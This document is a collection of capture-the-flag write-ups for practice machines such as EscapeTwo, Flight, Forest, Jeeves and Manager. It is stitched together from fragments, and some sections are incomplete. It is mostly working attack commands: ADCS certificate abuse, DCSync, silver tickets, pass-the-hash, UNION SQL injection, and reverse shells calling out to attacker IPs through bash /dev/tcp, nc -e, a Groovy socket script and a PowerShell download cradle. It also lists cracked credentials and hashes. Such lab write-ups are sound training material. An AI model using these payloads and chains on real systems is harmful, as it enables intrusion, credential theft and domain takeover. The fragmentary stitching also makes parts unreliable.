ESC9 conditions: - StrongCertificateBindingEnforcement not set to 2 (default: 1) or CertificateMappingMethods contains UPN flag - Certificate contains CT_FLAG_NO_SECURITY_EXTENSION flag in msPKI-Enrollment-Flag - Certificate specifies any client authentication EKU - Attacker has GenericWrite over another account

Changed ca_operator's UPN to Administrator (not Administrator@domain -- that would conflict):

certipy account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator -dc-ip 10.10.11.41

Requested certificate as ca_operator using the vulnerable template:

certipy req -u ca_operator -hashes :259745cb123a52aa2e693aaacca2db52 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.10.11.41

Had to run commands in quick succession:

Changed ca_operator UPN back to original:

certipy account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.10.11.41

Kept syncing the clock until the hash came through:

Administrator hash: aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34

docs.title: Extra notes
docs.text:
When dealing with clock skew, use faketime to create a synced shell instead of repeatedly running ntpdate:

faketime -f $(ntpdate -q dc | awk '{print $4}') zsh -l

docs.title: Lessons & takeaways
docs.text:
• AD certificate abuse chains can be long -- ownership -> group membership -> shadow credentials -> ESC9
  • ESC9 works by changing a user's UPN to Administrator before requesting a certificate
  • Clock skew is a common issue with Kerberos -- sync with the DC or use faketime
  • The faketime trick avoids having to change system time and re-sync repeatedly

docs.text:

Found: Alfred:Welcome1!

Creds didn't work as Alfred, but did work with Administrator (password reuse):

Access denied on root.txt -- need to be chatterbox\administrator, not nt authority\system.

From Alfred's shell, created a credential object and spawned a new shell as Administrator:

$passwd = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force


$creds = New-Object System.Management.Automation.PSCredential('administrator', $passwd)


Start-Process -FilePath "powershell" -ArgumentList "-Command IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.142/writeup2.ps1')" -Credential $creds

Alternatively, from SYSTEM shell, take ownership of the file:

takeown /f "C:\Users\Administrator\Desktop\root.txt"
dir /q "C:\Users\Administrator\Desktop\root.txt"
icacls "C:\Users\Administrator\Desktop\root.txt" /grant SYSTEM:F

docs.title: Lessons & takeaways
docs.text:
• The -b switch in msfvenom excludes bad bytes, forcing use of an encoder like x86/unicode_mixed

const err = new Error();

  toString: new Proxy(() => "", {

    const process = args.constructor.constructor("return process")();
    throw process.mainModule.require("child_process").execSync('bash -c "bash -i >& /dev/tcp/10.10.14.191/6969 0>&1"').toString();

docs.title: Privilege escalation
docs.text:
Checked sudo permissions:

Can run the backup script, but not edit/overwrite it. Trying root:root gives password confirmation failed:

Examined the script:

Two issues:

  1. $USER_PASS is not quoted -- glob pattern * bypasses the check
  2. The calls to mysql/mysqldump pass the password on the command line (readable from /proc)

Uploaded pspy64, ran the script with * as the password, and caught the password from the process list:

  • Password: kljh12k3jhaskjh12kjh3

Alternative: brute force with glob matching since any correct prefix + * succeeds:

#!/usr/bin/env python3
import subprocess
import string
leaked_password = ""
while True:
  for c in string.printable[:-5]:
    if c in '*\\%':
      continue
    print(f"\r{leaked_password}{c}", flush=True, end="")
    success = False
    try:
      result = subprocess.run(f"echo '{leaked_password}{c}*' | sudo /opt/scripts/mysql-backup.sh", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, timeout=0.3)
    except subprocess.TimeoutExpired:
      success = True
    if success or "Password confirmed" in result.stdout.decode():
      leaked_password += c
      break
  else:
    break
print(f'\r{leaked_password}    ')

docs.title: Lessons & takeaways
docs.text:
• Unquoted variables in bash comparisons allow glob bypass (* matches anything)
  • Passwords passed as command-line arguments are visible in /proc -- use pspy to capture them
  • Always check for SQLite databases in web app directories

Crash sleep method -- generate a real crash dump:

sudo apport-cli -c /var/crash/_usr_bin_sleep.1000.crash

Fake data method -- create minimal crash file:

echo -e "ProblemType: Crash\nArchitecture: amd64" | tee example.crash
sudo apport-cli -c ./example.crash

Choose V, then !/bin/bash.

Caught the sql_svc hash with smbserver:

smbserver.py test . -smb2support

Cracked with hashcat:

hashcat -m 5600 -a 0 -o cracked.txt --force hash.txt /usr/share/wordlists/rockyou.txt

Result: sql_svc:REGGIE1234ronnie

MSSQL reconnect still couldn't enable xp_cmdshell, but WinRM worked:

nxc winrm 10.129.121.20 -u users.txt -p passwords.txt

evil-winrm -i 10.129.121.20 -u 'sql_svc' -p 'REGGIE1234ronnie'

docs.title: Lateral movement
docs.text:
Found creds in SQL error log backup:

C:\SQLServer\Logs\ERRORLOG.BAK contained Ryan.Cooper:NuclearMosquito3.

evil-winrm -i 10.129.121.20 -u 'Ryan.Cooper' -p 'NuclearMosquito3'

docs.title: Privesc
docs.text:
ADCS exploitation. Uploaded Certify.exe and found a vulnerable template:

./certify.exe find /vulnerable

The UserAuthentication template had ENROLLEE_SUPPLIES_SUBJECT flag and allowed Domain Users to enroll -- ESC1.

Requested a certificate as Administrator:

./certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator

Saved the key + cert to cert.pem, then converted:

openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

Authenticated with certipy to get Administrator's NTLM hash:

certipy auth -pfx cert.pfx -dc-ip 10.129.121.20 -username Administrator -domain sequel.htb


evil-winrm -i 10.129.121.20 -u 'Administrator' -H 'a52f78e4c751e5f5e17e1e9f3e58f4ee'

docs.title: Lessons & takeaways
docs.text:
• Always check SMB shares with guest access for sensitive documents
  • xp_dirtree in MSSQL is an easy way to coerce NTLMv2 hashes even without xp_cmdshell
  • SQL error logs can contain plaintext credentials
  • ADCS misconfigurations (ESC1: ENROLLEE_SUPPLIES_SUBJECT + Domain Users enrollment) are a direct path to DA

docs.title: EscapeTwo -- HackTheBox (write-up)
docs.text: Difficulty: Hard Box: EscapeTwo (HackTheBox) Author: dsec Date: 2025-02-14

docs.title: Assumed breach scenario. Extracted credentials from a corrupted .xlsx on an SMB share, pivoted through MSSQL to get a shell, then abused WriteOwner on a certificate service account to forge an admin certificate via ESC4 and get Domain Admin.
Target info
docs.text:
• Domain: sequel.htb / escapetwo.htb
  • Assumed breach creds: rose:KxEPkKe6R8su

docs.title: Enumeration
docs.text:
nxc errored out:

  • ryan is the only user in the Remote Management Users group.

Tried moving rose to remote users group with ldeep -- failed:

  • Got hash for sql_svc but could not crack it.

docs.title: SMB share & credential extraction
docs.text:
smbclient //10.10.11.51/Accounting\ Department -U rose
  • smbclient.py would not work due to space escaping issues. Had to use smbclient instead.

Found a corrupted .xlsx -- unzipped and examined the XML:

Extracted credentials from the shared strings XML: - angela:0fwz7Q4mSpurIt99 - oscar:86LxLBMgEWaKUnBG - kevin:Md9Wlq1E5bZnVDVo - sa:MSSQLP@ssw0rd!

docs.title: MSSQL & lateral movement
docs.text:
nxc mssql 10.10.11.51 -u sa -p 'MSSQLP@ssw0rd!' -x whoami --local-auth

Found ryan's password: WqSZAF6CysDQbGb3

docs.title: Certificate abuse (ESC4)
docs.text:
• ryan can set himself as the owner of CA_SVC.
  • CA_SVC is a certificate issuer.

Run these commands in a very fast sequence:

bloodyAD --host '10.10.11.51' -d 'escapetwo.htb' -u 'ryan' -p 'WqSZAF6CysDQbGb3' set owner 'ca_svc' 'ryan'

dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/"ryan":"WqSZAF6CysDQbGb3"

sudo ntpdate sequel.htb

certipy shadow auto -u 'ryan@sequel.htb' -p "WqSZAF6CysDQbGb3" -account 'ca_svc' -dc-ip '10.10.11.51'

Got ca_svc hash: 3b181b914e7a9d5508ea1e20bc2b7fce

Uploaded Certify.exe and ran it as ryan:

./Certify.exe find /domain:sequel.htb

  • ca_svc is a member of Cert Publishers group with inherited permissions.

Overwrote the certificate template:

KRB5CCNAME=$PWD/ca_svc.ccache certipy template -k -template DunderMifflinAuthentication -dc-ip 10.10.11.51 -target dc01.sequel.htb

Requested a certificate as administrator:

certipy req -u ca_svc -hashes '3b181b914e7a9d5508ea1e20bc2b7fce' -ca sequel-DC01-CA -target sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn administrator@sequel.htb -ns 10.10.11.51 -dns 10.10.11.51 -debug

Authenticated with the certificate (had to force the DC IP with -dc-ip):

certipy auth -pfx administrator_10.pfx -domain sequel.htb -dc-ip 10.10.11.51 -debug

Got admin hash: aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff

evil-winrm -i 10.10.11.51 -u 'administrator' -H '7a8d4e04986afa8ed4060f75e5a0b3ff'

docs.title: Lessons & takeaways
docs.text:
• smbclient handles share names with spaces; smbclient.py does not
  • Corrupted .xlsx files can sometimes be unzipped and examined as raw XML
  • WriteOwner on a certificate service account can be chained into ESC4 for domain admin
  • When certipy auth fails, use -debug and force the DC IP with -dc-ip

docs.title: Flight -- HackTheBox (write-up)
docs.text: Difficulty: Hard Box: Flight (HackTheBox) Author: dsec Date: 2025-07-10

docs.title: Subdomain enumeration found school.flight.htb with LFI. Responder captured svc_apache hash. Password reuse led to S.Moon, then NTLM theft from writable share gave C.Bum. Webshell on IIS via writable development directory. RBCD via machine account ticket delegation for domain admin.
Target info
docs.text:
• Host: 10.129.228.120
  • Domain: flight.htb
  • Services discovered: 53/tcp, 80/tcp (Apache), 88/tcp, 135/tcp, 139/tcp, 445/tcp, 464/tcp, 593/tcp, 3268/tcp, 3269/tcp, 9389/tcp

docs.title: Enumeration
docs.text:
nmap -p- 10.129.228.120 -vvv -sCV

Subdomain fuzzing:

wfuzz -u http://10.129.228.120 -H "Host: FUZZ.flight.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 7069

Found: school.flight.htb. Added to /etc/hosts.

feroxbuster -u http://school.flight.htb -x html,php

Found directory traversal on index.php?view=. Backslash \\ was blocked but forward slash / worked:

Tested for LFI vs file read. Created poc.txt with PHP code:

Content loaded as text (not executed), so source uses file_get_contents not include.

docs.title: Foothold
docs.text:
Used Responder to capture a hash via LFI:

sudo responder -I tun0

http://school.flight.htb/index.php?view=//10.10.14.172/test

Cracked svc_apache hash with hashcat:

hashcat -m 5600 -a 0 -o cracked.txt --force hash.txt /usr/share/wordlists/rockyou.txt

svc_apache:S@Ss!K@*t13

Enumerated shares and users:

nxc smb 10.129.228.120 -u svc_apache -p 'S@Ss!K@*t13' --shares
nxc smb 10.129.228.120 -u svc_apache -p 'S@Ss!K@*t13' --users

Password spray found S.Moon reusing the same password:

nxc smb 10.129.228.120 -u users.txt -p 'S@Ss!K@*t13' --continue-on-success

docs.title: Lateral movement
docs.text:
S.Moon had write access on the Shared share. Uploaded NTLM theft files:

python ntlm_theft.py --generate all --server 10.10.14.172 --filename dank
smbclient //flight.htb/shared -U S.Moon 'S@Ss!K@*t13'
prompt false
mput *

Responder captured C.Bum hash. Cracked: Tikkycoll_431012284

C.Bum had write access to the Web share. Uploaded a PHP webshell to school.flight.htb/styles/:

curl school.flight.htb/styles/shell.php?cmd=whoami
curl -G school.flight.htb/styles/shell.php --data-urlencode 'cmd=nc64.exe -e cmd.exe 10.10.14.172 443'

Got shell as svc_apache.

Found IIS on port 8000 (internal only) with a development directory writable by C.Bum. Used chisel to port forward:

# Kali
chisel server -p 8000 --reverse
# Target
.\c client 10.10.14.172:8000 R:8001:127.0.0.1:8000

IIS with ASP.NET. Uploaded an ASPX webshell to \inetpub\development\:

Got shell as iis apppool\defaultapppool.

docs.title: Privilege escalation
docs.text:
defaultapppool authenticates as the machine account. Used Rubeus to get a TGT delegation ticket:

.\rubeus.exe tgtdeleg /nowrap

Decoded and converted the ticket:

echo "<base64>" | base64 --decode > ticket.kirbi
minikerberos-kirbi2ccache ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache

DCSync for administrator hash:

secretsdump.py -k -no-pass g0.flight.htb -just-dc-user administrator

Used psexec with admin hash:

psexec.py administrator@flight.htb -hashes aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c

docs.title: Lessons & takeaways
docs.text:
• When \\ is blocked in LFI, try / -- different path separators may bypass filters
  • Writable SMB shares are prime targets for NTLM theft via malicious files
  • IIS defaultapppool authenticates as the machine account, enabling Kerberos delegation attacks
  • Chisel port forwarding is essential for reaching internal-only services

docs.text: Difficulty: Easy Box: Forest (HackTheBox) Author: dsec Date: 2025-01-07

docs.title: Null session enum4linux found domain users. AS-REP roasted svc-alfresco, cracked the hash. Added a new user to Exchange Windows Permissions group, granted DCSync rights via PowerView, then secretsdump for Administrator hash.
Target info
docs.text:
• Host: 10.129.175.196 / 10.129.95.210
  • Domain: htb.local
  • Services discovered: 53, 88, 135, 139, 389, 445, 593, 636, 3268, 3269, 5985, 9389

docs.title: Enumeration
docs.text:
nmap was too slow, used rustscan:

rustscan -a 10.129.175.196 -- -sCV

Key services: DNS, Kerberos, LDAP, SMB, WinRM.

ldapsearch -d 1 -x -H ldap://10.129.175.196 -b "dc=htb,dc=local"

Lots of info returned.

enum4linux -a -u "" -p "" 10.129.175.196

Found users: sebastien, lucinda, svc-alfresco, andy, mark, santi

docs.text:
GetNPUsers.py -dc-ip 10.129.175.196 -request -usersfile users.txt htb.local/

Got svc-alfresco's AS-REP hash. Cracked it: s3rvice

docs.title: BloodHound
docs.text:
bloodhound-python -c All -dc FOREST.htb.local -gc FOREST.htb.local -ns 10.129.175.196 -d htb.local -u svc-alfresco -p 's3rvice'

Command is finnicky -- may need to run it twice.

docs.title: DCSync via Exchange Windows Permissions
docs.text:
evil-winrm -i 10.129.95.210 -u 'svc-alfresco' -p 's3rvice'

Uploaded PowerView.ps1 (capitalized PowerView from PowerSploit):

. .\PowerView.ps1

svc-alfresco kept disappearing from Exchange Windows Permissions group, so I created a new user:

net user zeus password /add /domain
net group "Exchange Windows Permissions" /add zeus
net user zeus

Confirmed Exchange Windows Permissions is listed.

$pass = convertto-securestring 'password' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('htb\zeus', $pass)
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity zeus -Rights DCSync

If it fails, re-import PowerView.ps1.

From kali:

secretsdump.py -just-dc htb.local/zeus:password@10.129.95.210

Got: Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::

Pass the hash:

nxc winrm 10.129.95.210 -u "Administrator" -H "aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6" -x "type C:\Users\Administrator\Desktop\root.txt"

Can also use:

psexec.py administrator@10.129.95.210 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
evil-winrm -i 10.129.95.210 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6

docs.title: Lessons & takeaways
docs.text:
• Null session enumeration still works on some DCs -- always try it
  • If a user keeps getting removed from a group (cleanup script), create a new user instead
  • Exchange Windows Permissions group membership + PowerView = DCSync rights
  • secretsdump.py with -just-dc is the cleanest way to dump hashes

docs.title: Heist -- Proving Grounds (write-up)
docs.text: Difficulty: Hard Box: Heist (Proving Grounds) Author: dsec Date: 2025-02-01

docs.title: Responder captured NTLMv2 hash from a web request, cracked it. BloodHound showed ReadGMSAPassword on a service account. Extracted the GMSA hash, got a shell as svc_apache$, then abused SeRestorePrivilege via the seclogon service for SYSTEM.

• Host: 192.168.221.165

docs.title: BloodHound -- GMSA path
docs.text:
BloodHound showed ReadGMSAPassword privilege on svc_apache$.

Confirmed the account is a GMSA-enabled service account:

Get-ADServiceAccount -Filter * | where-object {$_.ObjectClass -eq "msDS-GroupManagedServiceAccount"}

Got more details on the service account:

Get-ADServiceAccount -Filter {name -eq 'svc_apache'} -Properties * | Select CN,DNSHostName,DistinguishedName,MemberOf,Created,LastLogonDate,PasswordLastSet,msDS-ManagedPasswordInterval,PrincipalsAllowedToDelegateToAccount,PrincipalsAllowedToRetrieveManagedPassword,ServicePrincipalNames

Checked group membership:

Get-ADGroupMember 'Web Admins'

.\GMSAPasswordReader.exe --accountname svc_apache$

Hash: EA903FC3E46C88CFE2919D0C1CDC1162

evil-winrm -i 192.168.188.165 -u 'svc_apache$' -H 'EA903FC3E46C88CFE2919D0C1CDC1162'

docs.title: Privilege escalation -- SeRestorePrivilege
docs.text:
svc_apache$ has SeRestorePrivilege.

Targeted the seclogon service -- known to have manual start permissions for all authenticated users:

reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\seclogon


cmd.exe /c sc qc seclogon

Confirmed permissions:

cmd.exe /c sc sdshow seclogon

The RP descriptor with AU group means all authenticated users can start this service.

Used SeRestoreAbuse.exe:

.\SeRestoreAbuse.exe "C:\temp\nc.exe 192.168.45.208 4444 -e powershell.exe"

Shell was unstable but lasted long enough to get the flag. To stabilize: catch the SYSTEM shell and immediately push another shell to a second listener using just nc.exe.

docs.title: Lessons & takeaways
docs.text:
• Responder is always worth running -- web apps making outbound requests can leak NTLMv2 hashes
  • GMSA password extraction requires being in the right group -- BloodHound maps this path
  • SeRestorePrivilege + seclogon service = SYSTEM via SeRestoreAbuse
  • Unstable shells can be stabilized by immediately chaining to a second listener

nxc ldap 192.168.199.122 -u fmcsorley -p CrabSharkJellyfish192 --kdcHost 192.168.199.122 -M laps

nxc winrm 192.168.199.122 -u users.txt -p 'Or9d6Ek(4DV0iI'

docs.text:
Checked /etc/exports -- no no_root_squash, so standard SUID bash approach wouldn't work directly. Needed to create a user on attacker machine matching victim's UID.

Victim peter.turner UID was 902601108. Had to increase UID_MAX in /etc/login.defs:

Created matching user and mounted share:

docs.title: Lateral movement to DC
docs.text:
Found KeePass database. Extracted password:

kpcli passwords.kdbx

b0cwR+G4Dzl_rw

Ran Certipy to find vulnerable certificate templates:

certipy find -u peter.turner@hybrid.vl -p 'b0cwR+G4Dzl_rw' -dc-ip 10.10.235.181

Domain Computers had enrollment rights on HYBRIDCOMPUTERS template. Extracted machine account hash from krb5.keytab:

python3 keytabextract.py krb5.keytab

Hash: 0f916c5246fdbc7ba95dcef4126d57bd

Requested certificate as administrator:

certipy req -u 'MAIL01$' -hashes ":0f916c5246fdbc7ba95dcef4126d57bd" -dc-ip "10.10.232.21" -ca 'hybrid-DC01-CA' -template 'HYBRIDCOMPUTERS' -upn 'administrator' -target 'dc01.hybrid.vl' -key-size 4096 -debug

Authenticated with the certificate:

certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'hybrid.vl' -dc-ip 10.10.232.21

Admin hash: 60701e8543c9f6db1a2af3217386d3dc

docs.title: Lessons & takeaways
docs.text:
• NFS shares without no_root_squash can still be abused by creating a local user with a matching UID
  • Roundcube identity email fields can be exploited for command injection
  • Machine account keytabs (krb5.keytab) contain hashes usable for Certipy ESC attacks
  • Always check certificate templates with Certipy when you have domain user creds

Found downdetector.ps1 in IT share:

The script uses LDAP to get computers starting with "web", issues a web request with running user's creds, and emails Ted.Graves on failure.

Abused this by adding a DNS record pointing to my box, then capturing creds with Responder:

hashcat -m 5600 ted.graves.hash /usr/share/wordlists/rockyou.txt

python3 gMSADumper.py -u ted.graves -p Mr.Teddy -l intelligence.htb -d intelligence.htb

Got: svc_int$:::5e47bac787e5e1970cf9acdb5b316239

getST.py -dc-ip 10.129.227.54 -spn www/dc.intelligence.htb -hashes :51e4932f13712047027300f869d07ab6 -impersonate administrator intelligence.htb/svc_int


KRB5CCNAME=administrator.ccache wmiexec.py -k -no-pass administrator@dc.intelligence.htb

docs.title: Lessons & takeaways

• Enumerate predictable file naming patterns (date-based PDFs) to find hidden content and users
  • Scheduled scripts that make authenticated web requests can be abused with DNS poisoning + Responder
  • gMSA passwords can be dumped if you're in the right group -- check with BloodHound
  • Constrained delegation via getST.py -> wmiexec.py is a clean path to DA

Target info

• Host: 10.10.10.143 / supersecurehotel.htb
  • Services discovered: 22/tcp (ssh), 80/tcp (http)

docs.title: Enumeration
docs.text: Found /phpmyadmin. Tried admin:admin:

docs.title: SQL injection
docs.text:
The room.php?cod= parameter populates a page with blank info instead of an error -- indicates SQL injection (IDOR would generate an error).

Worked through UNION injection manually. Started with cod=100 (returns nothing), then incremented SELECT columns until the page populated again at 7 columns:

http://10.10.10.143/room.php?cod=100 UNION SELECT 1,2,3,4,5,6,7;-- -

Column mapping: 5=picture, 2=room title, 3=price, 4=description.

Compared to normal page:

Used column 2 for injection (text-based, displayed on page):

Extracted database names:

SELECT 1, group_concat(schema_name), 3, 4, 5, 6, 7 from information_schema.schemata;-- -

Extracted MySQL credentials:

http://supersecurehotel.htb/room.php?cod=100%20UNION%20SELECT%201,%20user,3,%20password,%205,%206,%207%20from%20mysql.user;--%20-

  • DBadmin:2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
  • Crackstation: imissyou

docs.title: Foothold
docs.text:
Logged into /phpmyadmin as DBadmin:imissyou (case-sensitive):

phpMyAdmin 4.8:

python 50457.py 10.129.229.137 80 /phpmyadmin DBadmin imissyou "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.191 6969 >/tmp/f"

docs.title: Lateral movement (www-data to pepper)
docs.text:
The ping option in simpler.py uses a system call. Forbidden characters filter is missing $() (bash command substitution):

Tested: $(echo 191) gets interpreted as 191:

Created a reverse shell script:

echo -e '#!/bin/bash\n\nnc -e /bin/bash 10.10.14.191 443' > /tmp/d.sh

sudo -u pepper /var/www/Admin-Utilities/simpler.py -p

Enter an IP: $(/tmp/d.sh)

docs.title: Privilege escalation (pepper to root)
docs.text:
Only root and users in group pepper can run systemctl, and it runs as root.

Created a malicious systemd service:

cat >dank1.service<<EOF
[Service]
Type=notify
ExecStart=/bin/bash -c 'nc -e /bin/bash 10.10.14.191 4443'
KillMode=process
Restart=on-failure
RestartSec=42s
[Install]
WantedBy=multi-user.target
EOF

Linked and started:

systemctl link /dev/shm/dank1.service
systemctl start dank1

docs.title: Lessons & takeaways
docs.text:
• UNION injection column count must match the original query -- increment until the page renders
  • group_concat() is essential for pulling multiple rows into one injection response
  • Command substitution $() is often missed in blacklist filters
  • SUID on systemctl allows linking and starting arbitrary service files for root shells

docs.title: Initial foothold
docs.text:
Used the Jenkins Script Console to get a reverse shell with Groovy:

String host="10.10.14.46";
int port=6969;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

nc -lvnp 6969

Got a shell as kohsuke.

docs.title: Lateral movement
docs.text:
Found CEH.kdbx in C:\Users\kohsuke\Documents. Exfiltrated via SMB:

smbserver.py Folder pwd

C:\Users\kohsuke\Documents> net use s: \\10.10.14.46\Folder
C:\Users\kohsuke\Documents> copy CEH.kdbx s:

Cracked the KeePass database:

keepass2john CEH.kdbx > keepass.hash
john keepass.hash -w:/usr/share/wordlists/rockyou.txt

Password: moonshine1

Inside the database, the "Backup stuff" entry contained an NTLM hash:

Pass: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00

Other entries included DC Recovery PW (administrator:S1TjAtJHKsugh9oC4VZl) and various other credentials, but the hash was the key.

docs.title: Privesc
docs.text:
Pass-the-hash with psexec:

psexec.py JEEVES/administrator@10.129.253.173 -hashes 'aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00'

Got admin shell. The root flag was hidden in an alternate data stream:

c:\Users\Administrator\Desktop> type hm.txt
The flag is elsewhere. Look deeper.

c:\Users\Administrator\Desktop> dir /r
  34 hm.txt:root.txt:$DATA

c:\Users\Administrator\Desktop> more < hm.txt:root.txt
afbc5bd4b615a60648cec41c6ac92530

docs.title: Lessons & takeaways
docs.text:
• Jenkins Script Console is an instant shell if accessible
  • Always check for KeePass databases -- they often store domain creds
  • Use dir /r to find alternate data streams on Windows
  • Pass-the-hash with psexec is reliable when you have NTLM hashes

docs.title: Two-machine chain. Enumerated users and found ben.cox:Trinity1. Decrypted a DPAPI credential blob to get local admin creds. Accessed an internal web app to find svc_web and tony.ward passwords. Silver ticket attack using svc_web's password to impersonate tony.ward (Backup Admins group), then used reg.py to back up registry hives for DA.
Target info
docs.text:
• Host 1: .37 (member server)
  • Host 2: .38 (DC - LusDC.lustrous.vl)
  • Domain: lustrous.vl

docs.title: Enumeration
docs.text:
.37:

.38 (DC):

Found ben.cox:Trinity1.

None ASREPRoastable.

docs.title: DA path
docs.text:
Tony.Ward is in the Backup Admins group -- owning this user is an easy path to DA.

Found svc_web password: iydgTvmujl6f

RDP into the .102 DC with local admin creds, accessed lusdc.lustrous.vl through Edge using ben.cox creds:

Clicking notes for tony.ward revealed: tony.ward:U_cPVQqEI50i1X

docs.title: Silver ticket attack
docs.text:
Since we own the svc_web service account credentials, we can forge a TGS (silver ticket). The service trusts any ticket encrypted with its key, so we can claim to be any user.

Got domain SID with lookupsid:

S-1-5-21-2355092754-1584501958-1513963426

Generated NTLM hash from svc_web password:

E67AF8B3D78DF5A02EB0D57B6CB60717

Forged silver ticket as Administrator:

kerberos::golden /sid:S-1-5-21-2355092754-1584501958-1513963426 /domain:lustrous.vl /ptt /id:500 /target:LusDC.lustrous.vl /service:HTTP /rc4:E67AF8B3D78DF5A02EB0D57B6CB60717 /user:administrator

Then forged as tony.ward (RID 1114):

kerberos::golden /sid:S-1-5-21-2355092754-1584501958-1513963426 /domain:lustrous.vl /ptt /id:1114 /target:LusDC.lustrous.vl /service:HTTP /rc4:E67AF8B3D78DF5A02EB0D57B6CB60717 /user:tony.ward

Confirmed tony.ward:U_cPVQqEI50i1X.

docs.title: Registry backup for DA
docs.text:
Started an SMB share for exfiltration:

impacket-smbserver -smb2support "share" .

Backed up registry hives:

reg.py tony.ward@LusDC.lustrous.vl backup -o '\\10.8.2.206\share'

Had to run the command twice for it to succeed.

docs.title: Lessons & takeaways
docs.text:
• DPAPI credential blobs on compromised hosts can contain high-value plaintext credentials
  • Silver ticket attacks work when you own a service account -- you can impersonate any user to that service
  • Backup Admins group members can extract registry hives (SAM/SYSTEM/SECURITY) remotely
  • Internal web applications often store credentials in notes or configuration pages

docs.title: RID brute-force enumerated users. Username-as-password spray found Operator:operator for MSSQL. xp_dirtree listed web backup containing raven's creds. ADCS ESC7 (ManageCA rights) abused to issue a certificate as Administrator via SubCA template for pass-the-hash.
Target info
docs.text:
• Host: 10.129.42.194
  • Domain: manager.htb / dc01.manager.htb
  • Services discovered: 53, 80, 88, 135, 139, 389, 445, 1433, 3268, 5985 and more

docs.title: Enumeration
docs.text:
nmap -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,49667,49693,49694,49732,54499,59175,61113 -sCV 10.129.42.194 -vvv

enum4linux -a -u "guest" -p "" 10.129.42.194

RID brute-force to enumerate users:

lookupsid.py manager.htb/anonymous@10.129.42.194 -no-pass

Password spray with username-as-password:

nxc smb 10.129.42.194 -u users.txt -p users_lowercase.txt --no-bruteforce --continue-on-success

Found Operator:operator -- auths for SMB, LDAP, and MSSQL (not WinRM).

docs.title: Foothold
docs.text:
Connected to MSSQL:

mssqlclient.py -windows-auth manager.htb/Operator:'operator'@10.129.42.194

Tried to coerce a hash with xp_dirtree but couldn't crack it:

EXEC xp_dirtree '\\10.10.14.30\test', 1, 1

Used xp_dirtree to enumerate the web root instead:

xp_dirtree C:\inetpub\wwwroot

Downloaded the backup:

wget http://manager.htb/website-backup-27-07-23-old.zip
unzip website-backup-27-07-23-old.zip -d webbackup/

Found creds: raven:R4v3nBe5tD3veloP3r!123

evil-winrm -i manager.htb -u raven -p 'R4v3nBe5tD3veloP3r!123'

docs.title: Privesc
docs.text:
Ran certipy to find ADCS vulnerabilities:

certipy find -dc-ip 10.129.42.194 -ns 10.129.42.194 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout

ESC7 -- Raven has ManageCA rights on manager-DC01-CA.

Added Raven as an officer:

certipy ca -ca manager-DC01-CA -add-officer raven -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'

Verified the change:

Requested a SubCA certificate as Administrator (intentionally fails but saves the private key):

certipy req -ca manager-DC01-CA -target dc01.manager.htb -template SubCA -upn administrator@manager.htb -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'

Issued the failed request:

certipy ca -ca manager-DC01-CA -issue-request 13 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'

Retrieved the certificate:

certipy req -ca manager-DC01-CA -target dc01.manager.htb -retrieve 13 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'

Authenticated with the certificate:

certipy auth -pfx administrator.pfx -dc-ip manager.htb

Got Administrator NTLM hash: aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef

docs.title: Lessons & takeaways
docs.text:
• Username-as-password sprays are surprisingly effective in AD environments
  • xp_dirtree in MSSQL can list file system contents even when you can't execute commands
  • Web backups left in the web root are a common source of credential leaks
  • ADCS ESC7 (ManageCA) allows issuing certificates through the SubCA template -- officer groups reset periodically so speed matters

docs.title: BloodHound & Azure AD Sync
docs.text:
BloodHound:

  • mhope is a member of Azure Admins group, which has GenericAll privs on the Domain Admin.

Used a script to exploit Azure AD Sync -- extracts encryption keys from the ADSync database, retrieves the encrypted config, then decrypts the domain admin password:

